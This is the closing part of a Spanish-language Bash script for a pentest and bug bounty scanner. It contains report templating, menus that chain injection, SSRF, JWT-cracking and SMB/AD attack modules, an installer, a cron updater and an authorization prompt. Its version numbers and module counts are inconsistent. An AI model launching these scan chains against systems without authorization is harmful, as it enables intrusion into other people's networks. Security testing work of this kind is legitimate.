    <div class="ver">▸ WriestTavo v3.0 — Bug Bounty &amp; Pentest Scanner ◂</div>
    <h1>⚡ Security Report :: ${TARGET}</h1>
    <div class="meta">
      <div class="meta-item">Target: <span>${TARGET}</span></div>
      <div class="meta-item">Fecha: <span>$(date '+%d/%m/%Y %H:%M')</span></div>
      <div class="meta-item">Modo: <span>${SCAN_MODE}</span></div>
      <div class="meta-item">CVSS Promedio: <span>${avg_cvss}</span></div>
    </div>
  </div>
</div>
<div class="container">
  ${intel_summary_html}
  ${exec_html}
  <h2 class="section-title">📊 Dashboard</h2>
  <div class="summary">
    <div class="card critical"><div class="count">${critical_count}</div><div class="label">Crítico</div></div>
    <div class="card high">    <div class="count">${high_count}</div>    <div class="label">Alto</div></div>
    <div class="card medium">  <div class="count">${medium_count}</div>  <div class="label">Medio</div></div>
    <div class="card low">     <div class="count">${low_count}</div>     <div class="label">Bajo</div></div>
    <div class="card info">    <div class="count">${info_count}</div>    <div class="label">Info</div></div>
    <div class="card cvss-card"><div class="count">${avg_cvss}</div><div class="label">CVSS Prom.</div></div>
  </div>
  <h2 class="section-title">🔍 Hallazgos Detallados</h2>
  <div class="filter-bar">
    <button class="filter-btn active" onclick="filterF('all',this)">Todos</button>
    <button class="filter-btn" style="color:#ff2d2d" onclick="filterF('critictico',this)">🔴 Crítico</button>
    <button class="filter-btn" style="color:#ff6b35" onclick="filterF('alto',this)">🟠 Alto</button>
    <button class="filter-btn" style="color:#ffd23f" onclick="filterF('medio',this)">🟡 Medio</button>
    <button class="filter-btn" style="color:#57cc99" onclick="filterF('bajo',this)">🟢 Bajo</button>
    <button class="filter-btn" style="color:#5bc0de" onclick="filterF('info',this)">ℹ Info</button>
    <button class="filter-btn" onclick="document.querySelectorAll('.finding').forEach(f=>f.classList.add('open'))">➕ Abrir todo</button>
    <button class="filter-btn" onclick="document.querySelectorAll('.finding').forEach(f=>f.classList.remove('open'))">➖ Cerrar todo</button>
  </div>
  <div id="fc">${findings_html}</div>
  <h2 class="section-title">📁 Archivos Generados</h2>
  <div class="files-grid">
DYNEOF

    find "${OUTPUT_DIR}" -type f ! -name "*.html" 2>/dev/null | sort | while read -r f; do
        echo "    <div class='file-item'><a href='${f}'>${f}</a></div>"
    done >> "${REPORT_FILE}"

    cat >> "${REPORT_FILE}" << 'FOOTEOF'
  </div>
  <div class="footer">
    <b style="color:#58a6ff">WriestTavo v3.0</b> by WRIΞSTTAV0 &nbsp;|&nbsp;
    29 módulos &nbsp;|&nbsp; Solo con autorización explícita
  </div>
</div>
<script>
document.querySelectorAll('.finding-header').forEach(h=>{
  h.addEventListener('click',()=>h.parentElement.classList.toggle('open'));
});
document.querySelectorAll('.finding-critictico,.finding-alto').forEach(f=>f.classList.add('open'));
function filterF(sev,btn){
  document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.querySelectorAll('.finding').forEach(f=>{
    f.style.display=(sev==='all'||f.classList.contains('finding-'+sev))?'block':'none';
  });
}
</script>
</body>
</html>
FOOTEOF

    ok "Reporte v3 generado: ${REPORT_FILE}"
}

# ─── MENÚ INTERACTIVO ───────────────────────────────────────────
menu_modulos() {
    echo -e "${C_BLU}╔══════════════════════════════════════╗${C_RST}"
    echo -e "${C_BLU}║     Selecciona módulos a ejecutar    ║${C_RST}"
    echo -e "${C_BLU}╚══════════════════════════════════════╝${C_RST}"
    echo
    echo -e "  ${C_GRN}[1]${C_RST} Full Scan v8.0 ${C_YEL}(45 módulos — stack moderno + AD + exploit intel)${C_RST}"
    echo -e "  ${C_GRN}[2]${C_RST} Recon OSINT  ${C_CYN}(crt.sh + theHarvester + dnsrecon + subdominios)${C_RST}"
    echo -e "  ${C_GRN}[3]${C_RST} Web + SSL     ${C_CYN}(WAF + nikto + nuclei + gobuster + sslscan + arjun)${C_RST}"
    echo -e "  ${C_GRN}[4]${C_RST} Bug Bounty Pro${C_CYN}(recon + framework + injection + CORS + JWT + SSRF)${C_RST}"
    echo -e "  ${C_GRN}[5]${C_RST} Injection Suite${C_CYN}(SQLi + NoSQLi + XSS + LFI + SSTI + SSRF + CORS + CMDi)${C_RST}"
    echo -e "  ${C_GRN}[6]${C_RST} API Modern    ${C_CYN}(endpoints + GraphQL + Swagger + arjun + JWT + CORS)${C_RST}"
    echo -e "  ${C_GRN}[7]${C_RST} Windows/Infra ${C_CYN}(IIS + NTLM + RDP + SMB + Docker + K8s + SNMP)${C_RST}"
    echo -e "  ${C_GRN}[8]${C_RST} Framework Deep${C_CYN}(whatweb + framework_scan + SSTI + SSRF + rutas críticas)${C_RST}"
    echo -e "  ${C_GRN}[9]${C_RST} WordPress     ${C_CYN}(wpscan + nuclei + gobuster + SQLi + XSS)${C_RST}"
    echo -e "  ${C_GRN}[10]${C_RST} CTF/HTB Mode ${C_CYN}(todos los módulos en modo agresivo)${C_RST}"
    echo -e "  ${C_GRN}[11]${C_RST} Custom        ${C_CYN}(elegir módulos 1-38)${C_RST}"
    echo
    echo -ne "${C_YEL}Opción [1-11]: ${C_RST}"
    read -r opcion

    case "$opcion" in
        1)  run_full_scan ;;
        2)  modulo_crtsh; modulo_theharvester; modulo_dnsrecon; modulo_subdominios ;;
        3)  modulo_waf; modulo_http_headers; modulo_whatweb; modulo_sslscan; modulo_nikto; modulo_nuclei; modulo_gobuster; modulo_arjun ;;
        4)  modulo_ttl_os; modulo_port_scan; modulo_version_scan
            modulo_crtsh; modulo_theharvester; modulo_dnsrecon; modulo_subdominios
            modulo_waf; modulo_http_headers; modulo_whatweb; modulo_sslscan
            modulo_framework_scan; modulo_nuclei; modulo_gobuster; modulo_arjun
            modulo_endpoints; modulo_js_analysis; modulo_jwt
            modulo_sqli; modulo_xss; modulo_dalfox; modulo_lfi; modulo_ssrf; modulo_cors; modulo_xxe; modulo_idor_redirect; modulo_edb_intel ;;
        5)  modulo_arjun; modulo_sqli; modulo_sqlmap; modulo_nosqli
            modulo_xss; modulo_dalfox; modulo_commix; modulo_lfi; modulo_ssti; modulo_ssrf; modulo_cors ;;
        6)  modulo_waf; modulo_http_headers; modulo_whatweb; modulo_framework_scan
            modulo_endpoints; modulo_js_analysis; modulo_arjun; modulo_jwt; modulo_cors ;;
        7)  modulo_port_scan; modulo_version_scan; modulo_smb; modulo_cme; modulo_snmp
            modulo_smtp_enum; modulo_http_methods; modulo_infra_exposure; modulo_iis_windows; modulo_adpulse ;;
        8)  modulo_whatweb; modulo_framework_scan; modulo_ssti; modulo_ssrf; modulo_lfi ;;
        9)  modulo_waf; modulo_http_headers; modulo_wpscan; modulo_nuclei; modulo_gobuster
            modulo_sqli; modulo_xss; modulo_dalfox ;;
        10) SCAN_MODE="aggressive"
            modulo_port_scan; modulo_version_scan; modulo_waf; modulo_whatweb
            modulo_framework_scan; modulo_nuclei; modulo_gobuster; modulo_arjun
            modulo_sqli; modulo_sqlmap; modulo_nosqli; modulo_xss; modulo_dalfox
            modulo_commix; modulo_lfi; modulo_ssti; modulo_ssrf; modulo_cors
            modulo_jwt; modulo_http_methods; modulo_infra_exposure
            modulo_smb; modulo_cme; modulo_adpulse; modulo_vuln_scan; modulo_searchsploit ;;
        11) menu_custom ;;
        *)  warn "Opción inválida. Ejecutando Full Scan."; run_full_scan ;;
    esac
}

menu_custom() {
    echo
    echo -e "${C_YEL}Módulos v8.0 (38) — escribe números separados por espacio:${C_RST}"
    echo -e "  ${C_GRN} 1${C_RST}) TTL/OS          ${C_GRN} 2${C_RST}) Port Scan       ${C_GRN} 3${C_RST}) Version Scan"
    echo -e "  ${C_GRN} 4${C_RST}) WAF              ${C_GRN} 5${C_RST}) HTTP Headers    ${C_GRN} 6${C_RST}) WhatWeb"
    echo -e "  ${C_GRN} 7${C_RST}) Nikto            ${C_GRN} 8${C_RST}) Gobuster        ${C_GRN} 9${C_RST}) Subdominios"
    echo -e "  ${C_GRN}10${C_RST}) SMB              ${C_GRN}11${C_RST}) Vuln Scan       ${C_GRN}12${C_RST}) Searchsploit"
    echo -e "  ${C_GRN}13${C_RST}) SQLi básico      ${C_GRN}14${C_RST}) XSS básico      ${C_GRN}15${C_RST}) Endpoints/API"
    echo -e "  ${C_GRN}16${C_RST}) JS Analysis      ${C_GRN}17${C_RST}) theHarvester    ${C_GRN}18${C_RST}) dnsrecon"
    echo -e "  ${C_GRN}19${C_RST}) SSLScan          ${C_GRN}20${C_RST}) Nuclei          ${C_GRN}21${C_RST}) sqlmap"
    echo -e "  ${C_GRN}22${C_RST}) Dalfox (XSS)     ${C_GRN}23${C_RST}) Commix (CMDi)   ${C_GRN}24${C_RST}) Arjun"
    echo -e "  ${C_GRN}25${C_RST}) WPScan           ${C_GRN}26${C_RST}) crt.sh          ${C_GRN}27${C_RST}) SMTP Enum"
    echo -e "  ${C_GRN}28${C_RST}) SNMP             ${C_GRN}29${C_RST}) CrackMapExec    ${C_GRN}30${C_RST}) Framework Scan"
    echo -e "  ${C_GRN}31${C_RST}) LFI/Path Trav    ${C_GRN}32${C_RST}) SSRF            ${C_GRN}33${C_RST}) SSTI"
    echo -e "  ${C_GRN}34${C_RST}) CORS Misconfig   ${C_GRN}35${C_RST}) JWT Analysis    ${C_GRN}36${C_RST}) NoSQLi"
    echo -e "  ${C_GRN}37${C_RST}) HTTP Methods     ${C_GRN}38${C_RST}) Docker/K8s/Infra"
    echo -e "  ${C_GRN}39${C_RST}) XXE              ${C_GRN}40${C_RST}) IDOR+OpenRedirect  ${C_GRN}41${C_RST}) IIS Windows"
    echo -e "  ${C_GRN}43${C_RST}) EDB+NVD Intel    ${C_GRN}44${C_RST}) EDB Búsqueda      ${C_GRN}45${C_RST}) ADPulse Audit"
    echo
    echo -ne "${C_YEL}Selección: ${C_RST}"
    read -r seleccion

    for num in $seleccion; do
        case "$num" in
            1)  modulo_ttl_os ;;        2)  modulo_port_scan ;;     3)  modulo_version_scan ;;
            4)  modulo_waf ;;           5)  modulo_http_headers ;;  6)  modulo_whatweb ;;
            7)  modulo_nikto ;;         8)  modulo_gobuster ;;      9)  modulo_subdominios ;;
            10) modulo_smb ;;           11) modulo_vuln_scan ;;     12) modulo_searchsploit ;;
            13) modulo_sqli ;;          14) modulo_xss ;;           15) modulo_endpoints ;;
            16) modulo_js_analysis ;;   17) modulo_theharvester ;;  18) modulo_dnsrecon ;;
            19) modulo_sslscan ;;       20) modulo_nuclei ;;        21) modulo_sqlmap ;;
            22) modulo_dalfox ;;        23) modulo_commix ;;        24) modulo_arjun ;;
            25) modulo_wpscan ;;        26) modulo_crtsh ;;         27) modulo_smtp_enum ;;
            28) modulo_snmp ;;          29) modulo_cme ;;           30) modulo_framework_scan ;;
            31) modulo_lfi ;;           32) modulo_ssrf ;;          33) modulo_ssti ;;
            34) modulo_cors ;;          35) modulo_jwt ;;           36) modulo_nosqli ;;
            37) modulo_http_methods ;;  38) modulo_infra_exposure ;;
            39) modulo_xxe ;;           40) modulo_idor_redirect ;;  41) modulo_iis_windows ;;
            43) modulo_edb_intel ;;    44) modulo_edb_search ;;
            45) modulo_adpulse ;;   45) modulo_adpulse ;;
        esac
    done
}

run_full_scan() {
    log "════════════════════════════════════════"
    log " WriestTavo v8.0 — Full Scan (44 módulos)"
    log "════════════════════════════════════════"

    # ── FASE 1: Reconocimiento pasivo (sin tocar el target)
    log "── FASE 1: Reconocimiento Pasivo ──────"
    modulo_crtsh
    modulo_theharvester
    modulo_dnsrecon

    # ── FASE 2: Descubrimiento de infraestructura
    log "── FASE 2: Infraestructura ─────────────"
    modulo_ttl_os
    modulo_port_scan
    modulo_version_scan
    modulo_infra_exposure     # Docker/K8s/Prometheus antes de web

    # ── FASE 3: Servicios de red no-web
    log "── FASE 3: Servicios de Red ────────────"
    modulo_smb
    modulo_cme
    modulo_snmp
    modulo_smtp_enum
    modulo_subdominios

    # ── FASE 4: Fingerprinting web (alimenta INTEL para fases 5-7)
    log "── FASE 4: Fingerprinting Web ──────────"
    modulo_waf                # INTEL_WAF_DETECTED → ajusta delay en todos
    modulo_http_headers
    modulo_sslscan
    modulo_whatweb            # INTEL_FRAMEWORK_* → activa rutas específicas
    modulo_wpscan             # Solo si INTEL_CMS=wordpress
    modulo_nikto

    # ── FASE 5: Escaneo profundo (usa INTEL de fase 4)
    log "── FASE 5: Escaneo Profundo ────────────"
    modulo_nuclei             # Usa INTEL_CMS, INTEL_WAF
    modulo_framework_scan     # Usa INTEL_FRAMEWORK_* para rutas críticas
    modulo_gobuster           # Usa INTEL_WORDLIST_EXTRA según CMS/tech
    modulo_arjun              # Descubre parámetros → alimenta fase 6
    modulo_endpoints          # GraphQL, Swagger, API discovery
    modulo_js_analysis        # Secretos, JWTs, endpoints en bundles

    # ── FASE 6: Vulnerabilidades web (usa todo el INTEL acumulado)
    log "── FASE 6: Vulnerabilidades Web ────────"
    modulo_sqli               # Usa INTEL_INJECTABLE_URLS, INTEL_TECHNOLOGIES
    modulo_sqlmap             # Solo si INTEL_SQLI_FOUND=true
    modulo_nosqli             # Solo si mongodb/nosql en INTEL_TECHNOLOGIES
    modulo_xss                # Usa INTEL_INJECTABLE_URLS
    modulo_dalfox             # Confirma XSS con más contexto
    modulo_commix             # Command injection en mismas URLs
    modulo_lfi                # Path traversal → escala auto si encuentra
    modulo_ssrf               # Prueba cloud metadata automáticamente
    modulo_ssti               # Solo si framework con template engine
    modulo_cors               # Genera PoC automático si encuentra vuln
    modulo_jwt                # Busca JWTs en JS/headers y los crackea
    modulo_xxe                # XML injection en APIs Java/.NET/PHP
    modulo_idor_redirect      # IDOR + Open Redirect
    modulo_iis_windows        # Solo si Windows/IIS detectado
    modulo_http_methods       # PUT/TRACE/IIS específico

    # ── FASE 7: Post-scan y reporting
    log "── FASE 7: Post-Scan ───────────────────"
    modulo_adpulse        # ADPulse — AD audit si puerto 389/636/445 abierto
    modulo_edb_intel      # Exploit-DB + NVD + GHSA cruzado con el stack
    modulo_adpulse        # ADPulse — Active Directory (si puertos AD detectados)
    modulo_vuln_scan
    modulo_searchsploit
}

# ─── HELP ───────────────────────────────────────────────────────
show_help() {
    echo
    echo -e "${C_BOLD}WriestTavo v8.0${C_RST} :: Pentesting & Bug Bounty Scanner (41 módulos)"
    echo
    echo -e "Uso: sudo $0 [opciones] <IP | dominio>"
    echo
    echo -e "Opciones de escaneo:"
    echo -e "  -m, --mode    Modo: ${C_YEL}normal${C_RST} | ${C_YEL}stealth${C_RST} | ${C_YEL}aggressive${C_RST}"
    echo -e "  -o, --output  Directorio de salida (default: wriestTavo_results)"
    echo -e "  -h, --help    Mostrar esta ayuda"
    echo
    echo -e "Mantenimiento y actualización:"
    echo -e "  ${C_GRN}--update${C_RST}                  Actualiza nuclei, CVE feed NVD, SecLists, Exploit-DB"
    echo -e "  ${C_GRN}--install${C_RST}                 Instala todas las dependencias automáticamente"
    echo -e "  ${C_GRN}--cron${C_RST}                    Configura actualización diaria automática (6am)"
    echo -e "  ${C_GRN}--show-cves${C_RST}               Muestra CVEs cacheados y payloads custom actuales"
    echo
    echo -e "Agregar payloads propios:"
    echo -e "  ${C_GRN}--add-payload${C_RST} PAYLOAD ${C_GRN}--payload-type${C_RST} TYPE"
    echo -e "  Tipos: ${C_CYN}sqli${C_RST} | ${C_CYN}xss${C_RST} | ${C_CYN}lfi${C_RST} | ${C_CYN}ssrf${C_RST} | ${C_CYN}paths${C_RST}"
    echo
    echo -e "Agregar módulos propios:"
    echo -e "  Crear archivo .sh en: ${C_CYN}~/.wriestTavo/modules/modulo_mi_vuln.sh${C_RST}"
    echo -e "  Debe contener función ${C_CYN}modulo_mi_vuln()${C_RST} con la misma estructura"
    echo
    echo -e "Ejemplos:"
    echo -e "  ${C_CYN}sudo $0 192.168.1.1${C_RST}"
    echo -e "  ${C_CYN}sudo $0 --mode stealth 10.10.10.5${C_RST}"
    echo -e "  ${C_CYN}sudo $0 --mode aggressive -o /tmp/scan hackerone.com${C_RST}"
    echo
    echo -e "${C_YEL}⚠ AVISO LEGAL: Solo usar en sistemas con autorización explícita.${C_RST}"
    echo
}


# ─── HELPER: INSTALAR DEPENDENCIAS AUTOMÁTICAMENTE ──────────────
_run_install() {
    log "WriestTavo Installer — instalando herramientas v8.0"
    echo

    # Core
    local apt_tools=(nmap curl python3 python3-pip git wget unzip
        whatweb nikto gobuster wafw00f sslscan dnsrecon
        smtp-user-enum snmp sqlmap wpscan crackmapexec
        commix enum4linux-ng seclists wordlists)

    echo -e "${C_YEL}[1/4] Instalando via apt...${C_RST}"
    apt-get update -qq 2>/dev/null
    for tool in "${apt_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            echo -ne "  Instalando ${tool}... "
            apt-get install -y -qq "$tool" 2>/dev/null && \
                echo -e "${C_GRN}OK${C_RST}" || echo -e "${C_YEL}skip${C_RST}"
        else
            echo -e "  ${C_GRN}[✓]${C_RST} ${tool}"
        fi
    done

    # Nuclei (Go)
    echo -e "${C_YEL}[2/4] Instalando nuclei...${C_RST}"
    if ! command -v nuclei >/dev/null 2>&1; then
        if command -v go >/dev/null 2>&1; then
            go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2>/dev/null && \
                ok "nuclei instalado via go" || warn "Error instalando nuclei"
        else
            apt-get install -y -qq nuclei 2>/dev/null || \
                warn "Instalar manualmente: https://github.com/projectdiscovery/nuclei"
        fi
    else
        ok "nuclei ya instalado"
    fi
    command -v nuclei >/dev/null 2>&1 && nuclei -update-templates -silent 2>/dev/null

    # Python tools
    echo -e "${C_YEL}[3/4] Instalando via pip3...${C_RST}"
    local pip_tools=("arjun" "dnsrecon" "theHarvester")
    for pt in "${pip_tools[@]}"; do
        pip3 install "$pt" --break-system-packages -q 2>/dev/null && \
            ok "${pt} instalado" || echo -e "  ${C_YEL}[~]${C_RST} ${pt} (ya instalado o error)"
    done

    # subfinder/dalfox (Go)
    echo -e "${C_YEL}[4/4] Instalando tools Go (subfinder, dalfox)...${C_RST}"
    if command -v go >/dev/null 2>&1; then
        go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2>/dev/null && ok "subfinder" || true
        go install github.com/hahwul/dalfox/v2@latest 2>/dev/null && ok "dalfox" || true
    else
        warn "Go no instalado. Instalar para: subfinder, dalfox, nuclei"
        echo -e "  ${C_CYN}sudo apt install golang-go${C_RST}"
    fi

    # Inicializar sistema de actualización
    init_update_system
    echo
    ok "Instalación completa. Ejecuta: sudo $0 --update"
    echo -e "  ${C_CYN}Payloads custom: ${CUSTOM_PAYLOADS}/${C_RST}"
    echo -e "  ${C_CYN}Módulos custom:  ${CUSTOM_MODULES_DIR}/${C_RST}"
}

# ─── HELPER: CONFIGURAR CRON DE ACTUALIZACIÓN ───────────────────
_setup_cron() {
    log "Configurando actualización automática (cron diario 6am)"
    local script_abs
    script_abs=$(realpath "$0")
    local cron_line="0 6 * * * root ${script_abs} --update >> /var/log/wriestTavo_update.log 2>&1"
    local cron_file="/etc/cron.d/wriestTavo-update"

    echo "$cron_line" > "$cron_file"
    chmod 644 "$cron_file"
    ok "Cron creado: ${cron_file}"
    echo -e "  ${C_DIM}${cron_line}${C_RST}"
    echo
    echo -e "  Otras opciones de frecuencia:"
    echo -e "  ${C_CYN}Cada 12h  :${C_RST} 0 6,18 * * * root ${script_abs} --update"
    echo -e "  ${C_CYN}Cada lunes:${C_RST} 0 6 * * 1 root ${script_abs} --update"
    echo -e "  ${C_CYN}Solo nuclei (más rápido):${C_RST} 0 6 * * * root nuclei -update-templates -silent"
    echo
    echo -e "  Ver log: ${C_YEL}tail -f /var/log/wriestTavo_update.log${C_RST}"
    echo -e "  Quitar : ${C_YEL}sudo rm ${cron_file}${C_RST}"
}

# ─── HELPER: MOSTRAR CVEs CACHEADOS ─────────────────────────────
_show_cached_cves() {
    init_update_system
    echo -e "${C_BLU}═══ CVEs cacheados en ${CVE_CACHE} ═══${C_RST}"
    echo

    # NVD recientes
    if [[ -f "${CVE_CACHE}/nvd_recent.json" ]]; then
        echo -e "${C_YEL}CVEs críticos (CVSS≥9.0) — últimas 48h:${C_RST}"
        python3 - << PYNVD
import json
try:
    with open("${CVE_CACHE}/nvd_recent.json") as f: data = json.load(f)
    for v in data.get("vulnerabilities",[]):
        cve = v.get("cve",{})
        cid = cve.get("id","")
        desc = cve.get("descriptions",[{}])[0].get("value","")[:100]
        m = cve.get("metrics",{})
        score = 0
        for k in ["cvssMetricV31","cvssMetricV30","cvssMetricV2"]:
            if k in m:
                score = m[k][0].get("cvssData",{}).get("baseScore",0)
                break
        if score >= 9.0:
            print(f"  [{cid}] CVSS:{score} — {desc}")
except Exception as e:
    print(f"  Error: {e}")
PYNVD
    else
        echo -e "  ${C_YEL}Sin caché. Ejecuta: sudo $0 --update${C_RST}"
    fi

    echo
    # Stack CVEs
    local stack_files
    stack_files=$(find "${CVE_CACHE}" -name "stack_cves_*.txt" 2>/dev/null | sort -r | head -1)
    if [[ -n "$stack_files" ]]; then
        echo -e "${C_YEL}CVEs del stack (último scan):${C_RST}"
        tail -n +2 "$stack_files" | while IFS='|' read -r cid tech desc; do
            echo -e "  ${C_GRN}[${tech}]${C_RST} ${cid} — ${desc:0:90}"
        done
    fi

    echo
    # Payloads custom
    echo -e "${C_YEL}Payloads custom del usuario:${C_RST}"
    for ptype in sqli xss lfi ssrf paths; do
        local pf="${CUSTOM_PAYLOADS}/${ptype}_extra.txt"
        if [[ -s "$pf" ]]; then
            local count; count=$(wc -l < "$pf")
            echo -e "  ${C_GRN}${ptype}:${C_RST} ${count} payloads — ${pf}"
        else
            echo -e "  ${C_DIM}${ptype}: vacío${C_RST}"
        fi
    done

    echo
    # Módulos custom
    echo -e "${C_YEL}Módulos custom:${C_RST}"
    local mod_count=0
    for mf in "${CUSTOM_MODULES_DIR}"/*.sh; do
        [[ -f "$mf" ]] && echo -e "  ${C_GRN}[✓]${C_RST} $(basename $mf)" && ((mod_count++))
    done
    [[ $mod_count -eq 0 ]] && echo -e "  ${C_DIM}Sin módulos custom. Agregar en: ${CUSTOM_MODULES_DIR}/${C_RST}"
}

# ─── MAIN ───────────────────────────────────────────────────────
main() {
    # ── Parsear argumentos ────────────────────────────────────────
    local do_update=false do_install=false do_cron=false
    local do_add_payload="" PAYLOAD_TYPE_ARG="sqli"
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -m|--mode)       SCAN_MODE="$2";        shift 2 ;;
            -o|--output)     OUTPUT_DIR="$2";       shift 2 ;;
            -h|--help)       show_help;              exit 0  ;;
            --update)        do_update=true;         shift   ;;
            --install)       do_install=true;        shift   ;;
            --cron)          do_cron=true;           shift   ;;
            --add-payload)   do_add_payload="$2";   shift 2 ;;
            --payload-type)  PAYLOAD_TYPE_ARG="$2"; shift 2 ;;
            --show-cves)     _show_cached_cves;      exit 0  ;;
            -*)              err "Opción desconocida: $1"; show_help; exit 1 ;;
            *)               TARGET="$1";            shift   ;;
        esac
    done

    # ── Modo: --install ───────────────────────────────────────────
    if [[ "$do_install" == "true" ]]; then
        _run_install
        exit 0
    fi

    # ── Modo: --update (sin target requerido) ─────────────────────
    if [[ "$do_update" == "true" ]]; then
        init_update_system
        modulo_update
        exit 0
    fi

    # ── Modo: --cron (configura tarea automática) ─────────────────
    if [[ "$do_cron" == "true" ]]; then
        _setup_cron
        exit 0
    fi

    # ── Modo: --add-payload (agrega payload sin escanear) ─────────
    if [[ -n "$do_add_payload" ]]; then
        init_update_system
        local pfile="${CUSTOM_PAYLOADS}/${PAYLOAD_TYPE_ARG}_extra.txt"
        echo "$do_add_payload" >> "$pfile"
        ok "Payload agregado → ${pfile}"
        echo -e "  ${C_DIM}Contenido actual ($(wc -l < "$pfile") payloads):${C_RST}"
        cat "$pfile"
        exit 0
    fi

    [[ -z "$TARGET" ]] && show_help && exit 1

    # ── Normalizar TARGET (acepta URLs o IP/hostname) ─────────────
    ORIGINAL_URL=""
    if [[ "$TARGET" =~ ^https?:// ]]; then
        ORIGINAL_URL="${TARGET%/}"
        TARGET=$(echo "$TARGET" | sed -E 's|^https?://||; s|/.*||; s|:[0-9]+$||')
        ok "URL: ${C_YEL}${ORIGINAL_URL}${C_RST} → host: ${C_YEL}${TARGET}${C_RST}"
    fi

    check_root
    check_deps
    init_update_system
    load_custom_modules     # carga ~/.wriestTavo/modules/*.sh
    _load_custom_payloads   # carga payloads del usuario en memoria
    preparar_directorio
    show_banner

    echo -e "${C_YEL}⚠  AVISO LEGAL: Solo usar en sistemas con autorización explícita.${C_RST}"
    echo -ne "  ${C_GRN}Confirmo que tengo autorización [s/N]: ${C_RST}"
    read -r confirm
    [[ ! "${confirm,,}" =~ ^(s|si|yes|y|1)$ ]] && { warn "Abortado."; exit 1; }
    echo

    # ── Alertar si hay más de 7 días sin actualizar ───────────────
    if [[ -f "$LAST_UPDATE_FILE" ]]; then
        local last_ts now_ts days_old
        last_ts=$(date -d "$(cat "$LAST_UPDATE_FILE")" +%s 2>/dev/null || echo 0)
        now_ts=$(date +%s)
        days_old=$(( (now_ts - last_ts) / 86400 ))
        if (( days_old >= 7 )); then
            echo -e "${C_YEL}  ⚠  ${days_old} días sin actualizar. Ejecuta: ${C_CYN}sudo $0 --update${C_RST}"
            echo
        fi
    else
        echo -e "${C_YEL}  ⚠  Primera ejecución. Recomendado: ${C_CYN}sudo $0 --update${C_RST} primero.${C_RST}"
        echo
    fi

    menu_modulos

    # ── CVEs del stack detectado (post-scan, usa todo el INTEL) ──
    [[ ${#INTEL_TECHNOLOGIES[@]} -gt 0 ]] && buscar_cves_stack
    _report_stack_cves

    generar_reporte_html
    generar_tres_reportes

    echo
    echo -e "${C_BLU}════════════════════════════════════════════${C_RST}"
    echo -e "  ${C_GRN}SCAN COMPLETO${C_RST}"
    echo -e "  Reporte Original : ${C_YEL}${REPORT_FILE}${C_RST}"
    echo -e "  Reporte Cliente  : ${C_YEL}${REPORT_CLIENT}${C_RST}"
    echo -e "  Reporte Censurado: ${C_YEL}${REPORT_CENSORED}${C_RST}"
    echo -e "  Reporte Pentester: ${C_YEL}${REPORT_PENTESTER}${C_RST}"
    echo -e "  Archivos         : ${C_YEL}${OUTPUT_DIR}/${C_RST}"
    echo -e "  Payloads+        : ${C_CYN}${CUSTOM_PAYLOADS}/${C_RST}"
    echo -e "  Módulos+         : ${C_CYN}${CUSTOM_MODULES_DIR}/${C_RST}"
    echo -e "${C_BLU}════════════════════════════════════════════${C_RST}"
    echo -e "  Mantener  : ${C_DIM}sudo $0 --update${C_RST}"
}

main "$@"
